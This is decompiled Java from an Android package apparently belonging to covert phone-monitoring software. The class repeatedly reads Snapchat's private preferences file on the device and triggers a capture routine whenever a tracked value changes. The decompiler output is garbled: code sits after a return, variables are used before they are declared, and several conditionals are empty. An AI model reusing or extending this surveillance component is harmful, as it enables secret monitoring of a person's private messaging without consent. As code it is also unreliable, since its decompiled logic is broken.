package com.vvt.capture.snapchat.b;

import android.os.SystemClock;

class d
  implements Runnable
{
  d(c paramc) {}
  
  public void run()
  {
    long l = 3000L;
    for (;;)
    {
      try
      {
        SystemClock.sleep(l);
        localObject1 = "shared_prefs";
        localObject3 = "com.snapchat.android_preferences.xml";
        localObject1 = com.vvt.capture.snapchat.d.a((String)localObject1, (String)localObject3);
        localObject3 = this.a;
        localObject3 = ((c)localObject3).a;
        localObject3 = a.b((a)localObject3);
        localObject4 = this.a;
        localObject4 = ((c)localObject4).a;
        localObject4 = a.c((a)localObject4);
        localObject5 = this.a;
        localObject5 = ((c)localObject5).a;
        localObject5 = a.d((a)localObject5);
        localObject1 = com.vvt.capture.snapchat.d.a((String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
        localObject3 = this.a;
        localObject3 = ((c)localObject3).a;
        boolean bool1 = a.f((a)localObject3);
        if (!bool1) {
          continue;
        }
        int j = com.vvt.capture.snapchat.b.d((String)localObject1);
        bool1 = a.a();
        if (bool1) {}
        localObject3 = this.a;
        localObject3 = ((c)localObject3).a;
        int i = a.g((a)localObject3);
        if (i != j)
        {
          localObject3 = this.a;
          localObject3 = ((c)localObject3).a;
          a.a((a)localObject3, j);
          bool3 = a.a();
          if (bool3) {}
          localObject1 = com.vvt.capture.snapchat.d.a();
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (!bool2)
          {
            localObject3 = this.a;
            localObject3 = ((c)localObject3).a;
            localObject3 = a.b((a)localObject3);
            localObject4 = this.a;
            localObject4 = ((c)localObject4).a;
            localObject4 = a.c((a)localObject4);
            localObject5 = this.a;
            localObject5 = ((c)localObject5).a;
            localObject5 = a.d((a)localObject5);
            localObject1 = com.vvt.capture.snapchat.d.a((String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
            bool3 = com.vvt.capture.snapchat.c.b((String)localObject1);
            if (!bool3)
            {
              localObject1 = this.a;
              localObject1 = ((c)localObject1).a;
              a.h((a)localObject1);
            }
          }
        }
        boolean bool3 = a.a();
        if (bool3) {}
        localObject1 = this.a;
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject3;
        Object localObject4;
        Object localObject5;
        boolean bool2;
        boolean bool5;
        int k;
        boolean bool4 = a.c();
        if (!bool4) {
          continue;
        }
        c localc = this.a;
        continue;
      }
      finally
      {
        c.a(this.a, null);
      }
      c.a((c)localObject1, null);
      return;
      localObject3 = this.a;
      localObject3 = ((c)localObject3).a;
      bool5 = com.vvt.capture.snapchat.b.c((String)localObject1);
      a.a((a)localObject3, bool5);
      localObject3 = this.a;
      localObject3 = ((c)localObject3).a;
      bool2 = a.f((a)localObject3);
      if (bool2)
      {
        localObject3 = this.a;
        localObject3 = ((c)localObject3).a;
        k = com.vvt.capture.snapchat.b.d((String)localObject1);
        a.a((a)localObject3, k);
        localObject1 = com.vvt.capture.snapchat.d.a();
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          localObject3 = this.a;
          localObject3 = ((c)localObject3).a;
          localObject3 = a.b((a)localObject3);
          localObject4 = this.a;
          localObject4 = ((c)localObject4).a;
          localObject4 = a.c((a)localObject4);
          localObject5 = this.a;
          localObject5 = ((c)localObject5).a;
          localObject5 = a.d((a)localObject5);
          localObject1 = com.vvt.capture.snapchat.d.a((String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
          bool4 = com.vvt.capture.snapchat.c.b((String)localObject1);
          if (!bool4)
          {
            localObject1 = this.a;
            localObject1 = ((c)localObject1).a;
            a.h((a)localObject1);
          }
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */